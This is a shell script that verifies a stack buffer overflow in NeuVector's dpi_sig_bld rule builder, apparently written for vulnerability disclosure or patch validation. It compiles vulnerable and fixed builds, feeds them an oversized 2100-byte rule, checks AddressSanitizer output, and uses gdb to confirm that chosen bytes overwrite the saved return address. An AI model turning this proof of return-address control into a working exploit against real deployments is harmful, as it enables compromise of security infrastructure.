#!/usr/bin/env bash
# One-command local verification for CVE-2026-127182 (NeuVector dpi_sig_bld).
set -u
cd "$(dirname "$0")"
mkdir -p out

pass=0
fail=0
ok()   { echo "PASS $1"; pass=$((pass+1)); }
bad()  { echo "FAIL $1"; fail=$((fail+1)); }
has()  { grep -q -- "$2" "$1" 2>/dev/null; }
hasnt() { ! grep -q -- "$2" "$1" 2>/dev/null; }

ASAN_FLAGS="-fsanitize=address -fno-omit-frame-pointer -O0 -g -I."
PLAIN_FLAGS="-O0 -g -fno-stack-protector -I."
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0

echo "== build =="
gcc   $ASAN_FLAGS -o out/asan-vuln harness/driver.c && ok "gcc asan vulnerable build" || bad "gcc asan vulnerable build"
clang $ASAN_FLAGS -o out/clang-asan-vuln harness/driver.c && ok "clang asan vulnerable build" || bad "clang asan vulnerable build"
gcc   $ASAN_FLAGS -DVARIANT_FIXED -o out/asan-fixed harness/driver.c && ok "gcc asan fixed build" || bad "gcc asan fixed build"
gcc   $PLAIN_FLAGS -DPLAIN_MODE -o out/plain-vuln harness/driver.c && ok "plain vulnerable build" || bad "plain vulnerable build"
gcc   $PLAIN_FLAGS -DPLAIN_MODE -DVARIANT_FIXED -o out/plain-fixed harness/driver.c && ok "plain fixed build" || bad "plain fixed build"
gcc   -O0 -g -I. -DPLAIN_MODE -o out/plain-protected harness/driver.c && ok "plain stack-protected build" || bad "plain stack-protected build"

echo "== runs =="
out/asan-vuln      attack > out/gcc-attack.log 2>&1 || true
out/clang-asan-vuln attack > out/clang-attack.log 2>&1 || true
out/asan-fixed     attack > out/fixed-attack.log 2>&1 || true
out/asan-vuln      safe   > out/vuln-safe.log 2>&1 || true
out/asan-fixed     safe   > out/fixed-safe.log 2>&1 || true
out/plain-vuln     attack > out/plain-attack.log 2>&1 || true
out/plain-vuln     safe   > out/plain-safe.log 2>&1 || true
out/plain-fixed    attack > out/plain-fixed-attack.log 2>&1 || true
out/plain-protected attack > out/plain-protected-attack.log 2>&1 || true

echo "== gcc ASan attack (2100-byte rule pattern into 2048-byte stack buffer) =="
has out/gcc-attack.log "AddressSanitizer: stack-buffer-overflow" && ok "gcc ASan stack-buffer-overflow" || bad "gcc ASan stack-buffer-overflow"
has out/gcc-attack.log "WRITE of size 2107" && ok "gcc ASan WRITE of size 2107" || bad "gcc ASan WRITE of size 2107"
has out/gcc-attack.log "offset 2080 overflows this variable" && ok "write exactly past 2048-byte dlpsig_buf" || bad "write exactly past 2048-byte dlpsig_buf"
has out/gcc-attack.log "'dlpsig_buf' (line 4)" && ok "ASan names pinned stack buffer" || bad "ASan names pinned stack buffer"
has out/gcc-attack.log "dpi_sig_bld pins/dpi-vulnerable.inc:41" && ok "ASan write frame pins vulnerable sprintf" || bad "ASan write frame pins vulnerable sprintf"

echo "== clang ASan attack =="
has out/clang-attack.log "AddressSanitizer: stack-buffer-overflow" && ok "clang ASan stack-buffer-overflow" || bad "clang ASan stack-buffer-overflow"
has out/clang-attack.log "dpi-vulnerable.inc:41" && ok "clang ASan pins vulnerable excerpt line" || bad "clang ASan pins vulnerable excerpt line"

echo "== fixed control =="
hasnt out/fixed-attack.log "AddressSanitizer" && ok "fixed build ASan-clean on attack" || bad "fixed build ASan-clean on attack"
has out/fixed-attack.log "MODE=attack PATLEN=2100 RC=0 SIG_LEN=0" && ok "fixed build rejects oversized rule" || bad "fixed build rejects oversized rule"
hasnt out/fixed-safe.log "AddressSanitizer" && ok "fixed build ASan-clean on safe input" || bad "fixed build ASan-clean on safe input"
has out/fixed-safe.log "SIG_LEN=35" && ok "fixed build accepts safe rule" || bad "fixed build accepts safe rule"

echo "== safe-input control on vulnerable body =="
hasnt out/vuln-safe.log "AddressSanitizer" && ok "vulnerable build ASan-clean on safe input" || bad "vulnerable build ASan-clean on safe input"
has out/vuln-safe.log "SIG_LEN=35" && ok "vulnerable build accepts safe input" || bad "vulnerable build accepts safe input"

echo "== plain chosen-byte readback =="
has out/plain-fixed-attack.log "SIG_LEN=0" && ok "plain fixed build rejects oversized rule" || bad "plain fixed build rejects oversized rule"
has out/plain-fixed-attack.log "CANARY_AFTER=00000000000000000000000000000000" && ok "plain fixed build writes no chosen marker" || bad "plain fixed build writes no chosen marker"
hasnt out/plain-safe.log "4d4d4d4d" && ok "plain safe input writes no chosen marker" || bad "plain safe input writes no chosen marker"

gdb -q -batch \
    -ex 'break pins/dpi-vulnerable.inc:45' \
    -ex 'run attack' \
    -ex 'x/16xb &dlpsig_buf[2048]' \
    -ex 'printf "RET=%p\n", *(void **)$rbp' \
    --args ./out/plain-vuln attack > out/gdb-readback.log 2>&1 || true
grep -A1 '0x.*:.*0x4d' out/gdb-readback.log | head -2 > out/gdb-canary.log || true
[ "$(grep -o '0x4d' out/gdb-canary.log | wc -l)" -ge 12 ] && ok "gdb reads chosen 0x4d bytes past dlpsig_buf" || bad "gdb reads chosen 0x4d bytes past dlpsig_buf"
has out/gdb-readback.log "RET=0x4d4d4d4d4d4d4d4d" && ok "chosen bytes overwrite saved return slot" || bad "chosen bytes overwrite saved return slot"

echo "== negative control: default stack protector =="
has out/plain-protected-attack.log "stack smashing detected" && ok "default stack protector aborts vulnerable plain build" || bad "default stack protector aborts vulnerable plain build"

echo "== pins =="
for pair in "pins/dpi-vulnerable.inc a3f74b69151d28acd5cb80eeb1a79949016598f61e0213272648888bbdcea10f" \
            "pins/dpi-fixed.inc b08af876c7ac71f2f3416b6dc9ee9f0c27816742fc6aea71a4e68bad1431de59" \
            "src/dpi_sig-vulnerable.c 1fbf0ba4aa731f8a92801002d2fe39141c2a88ea9a96d18507af47ae3303072b" \
            "src/dpi_sig-fixed.c cc9d9c48ea07b015c7254946ab1c630f3aea2ce3a80d0042880b5cedaa284b08"; do
    set -- $pair
    got=$(sha256sum "$1" | cut -d' ' -f1)
    [ "$got" = "$2" ] && ok "pin hash $1" || bad "pin hash $1"
done

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
